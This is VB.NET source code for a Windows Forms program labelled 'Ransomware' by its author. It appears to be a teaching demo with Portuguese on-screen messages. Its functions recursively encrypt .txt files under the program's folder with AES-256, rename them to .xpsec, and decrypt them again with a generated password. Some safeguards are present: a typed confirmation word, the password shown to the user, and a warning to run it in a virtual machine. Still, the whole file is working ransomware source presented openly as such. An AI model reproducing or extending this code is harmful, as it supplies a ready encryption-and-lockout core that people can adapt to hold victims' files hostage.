Imports System.Text
Imports System.Security.Cryptography
Imports System.IO
'╔═════════════════════════════════════════════╗
'║  ██╗  ██╗██████╗ ███████╗███████╗ ██████╗   ║
'║  ╚██╗██╔╝██╔══██╗██╔════╝██╔════╝██╔════╝   ║
'║   ╚███╔╝ ██████╔╝███████╗█████╗  ██║        ║
'║   ██╔██╗ ██╔═══╝ ╚════██║██╔══╝  ██║        ║
'║  ██╔╝ ██╗██║     ███████║███████╗╚██████╗   ║
'║  ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝ ╚═════╝   ║
'║                                             ║
'║  Ransomware by: Ricardo Machado (Drone)     ║
'╚═════════════════════════════════════════════╝
Public Class Form1
    Public Function CreatePassword(ByVal length As Integer) As String
        Const valid As String = "abcdefghijklmnopqrstuvwxyz1234567890"
        Dim res As StringBuilder = New StringBuilder()
        Dim rnd As Random = New Random()
        While 0 < Math.Max(System.Threading.Interlocked.Decrement(length), length + 1)
            res.Append(valid(rnd.[Next](valid.Length)))
        End While
        Return res.ToString()
    End Function
#Region "Encrypt"
    Public Function AES_Encrypt(ByVal bytesToBeEncrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Using ms As MemoryStream = New MemoryStream()
            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC
                Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using
                encryptedBytes = ms.ToArray()
            End Using
        End Using
        Return encryptedBytes
    End Function
    Public Sub encryptDirectory(ByVal location As String, ByVal password As String)
        Dim validExtensions = {".txt"}
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)
        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))
            If validExtensions.Contains(extension) Then
                EncryptFile(files(i), password)
            End If
        Next
        For i As Integer = 0 To childDirectories.Length - 1
            encryptDirectory(childDirectories(i), password)
        Next
    End Sub
    Public Sub EncryptFile(ByVal file As String, ByVal password As String)
        Dim bytesToBeEncrypted As Byte() = System.IO.File.ReadAllBytes(file)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
        Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
        System.IO.File.WriteAllBytes(file, bytesEncrypted)
        System.IO.File.Move(file, file & ".xpsec")
    End Sub
#End Region
#Region "Decrypt"
    Public Function AES_Decrypt(ByVal bytesToBeDecrypted As Byte(), ByVal passwordBytes As Byte()) As Byte()
        Dim decryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Using ms As MemoryStream = New MemoryStream()
            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC
                Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length)
                    cs.Close()
                End Using
                decryptedBytes = ms.ToArray()
            End Using
        End Using
        Return decryptedBytes
    End Function
    Public Sub DecryptDirectory(ByVal location As String)
        Dim password As String = TextBox1.Text
        Dim files As String() = Directory.GetFiles(location)
        Dim childDirectories As String() = Directory.GetDirectories(location)
        For i As Integer = 0 To files.Length - 1
            Dim extension As String = Path.GetExtension(files(i))
            If extension = ".xpsec" Then
                DecryptFile(files(i), password)
            End If
        Next
        For i As Integer = 0 To childDirectories.Length - 1
            DecryptDirectory(childDirectories(i))
        Next
    End Sub
    Public Sub DecryptFile(ByVal file As String, ByVal password As String)
        Dim bytesToBeDecrypted As Byte() = System.IO.File.ReadAllBytes(file)
        Dim pt As String = file.Replace(".xpsec", "")
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
        Dim bytesDecrypted As Byte() = AES_Decrypt(bytesToBeDecrypted, passwordBytes)
        System.IO.File.WriteAllBytes(pt, bytesDecrypted)
        System.IO.File.Delete(file)
    End Sub
#End Region
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        MsgBox("O conhecimento é uma ferramenta, tornar-lo uma arma, depende de você!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Mensagem de Drone")
        MsgBox("Executar de preferência em uma máquina virtual!", MsgBoxStyle.Exclamation + MsgBoxStyle.OkOnly, "Ransomware")
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim questionador As String = MsgBox("Você tem certeza que deseja CRIPTOGRAFAR seus arquivos ?", MsgBoxStyle.Question + MsgBoxStyle.YesNo, "Ransomware")
        If questionador = "6" Then
            If TextBox2.Text = "CRYPTOME" Then
                Dim senha_descriptografia As String = CreatePassword(10)
                TextBox1.Text = senha_descriptografia
                encryptDirectory(Application.StartupPath & "\", senha_descriptografia)
                MsgBox("Senha para descriptografar: " & senha_descriptografia & vbNewLine & "NÃO SE ESQUEÇA." & vbNewLine & vbNewLine & "Criptografia completa!", MsgBoxStyle.Critical + MsgBoxStyle.OkOnly, "Ransomware")
            Else
                MsgBox("Você errou a senha, para criptografar digite 'CRYPTOME' do contrário, o processo não funcionará!", MsgBoxStyle.Critical + MsgBoxStyle.OkOnly, "Ransomware")
            End If
        End If
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        DecryptDirectory(Application.StartupPath & "\")
        MsgBox("Descriptografia completa!", MsgBoxStyle.OkOnly + MsgBoxStyle.Information, "Ransomware")
    End Sub
End Class